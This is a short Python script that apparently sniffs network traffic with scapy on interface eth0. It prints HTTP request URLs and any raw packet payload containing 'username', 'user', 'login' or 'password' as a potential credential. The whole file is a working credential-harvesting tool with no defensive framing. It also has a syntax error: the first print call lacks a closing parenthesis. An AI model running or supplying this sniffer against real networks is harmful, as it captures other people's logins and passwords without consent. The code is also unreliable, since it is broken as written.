#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    """
    User scapy.sniff to capture date from an interface
    :param interface: interface to sniff
    :return: don't store anything in memory; print the sniffed packet
    """
    scapy.sniff(iface=interface,
                store=False,
                prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + (str(url))

    login_info = get_login_info(packet)
    if login_info:
        print("\n\n[+] Potential username or password: "
              + login_info + "\n\n")


sniff("eth0")

